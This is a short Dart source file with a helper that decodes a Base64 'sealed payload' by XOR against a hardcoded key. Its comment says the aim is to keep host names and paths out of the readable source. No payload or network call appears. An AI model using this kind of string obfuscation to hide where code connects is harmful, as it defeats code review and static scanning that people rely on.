import 'dart:convert';

/// 运行时解封密封载荷（XOR + Base64）。源码中不出现明文主机/路径。
class PayloadCipher {
  PayloadCipher._();

  static const List<int> _key = [
    0x5A, 0x3C, 0x91, 0xE2, 0x17, 0xB4, 0x6D, 0x08,
    0xC9, 0xF1, 0x22, 0x7A, 0x44, 0x9B, 0x0E, 0xD5,
  ];

  static String unveil(String sealedB64) {
    final raw = base64Decode(sealedB64);
    final out = List<int>.generate(
      raw.length,
      (i) => raw[i] ^ _key[i % _key.length],
    );
    return utf8.decode(out);
  }
}
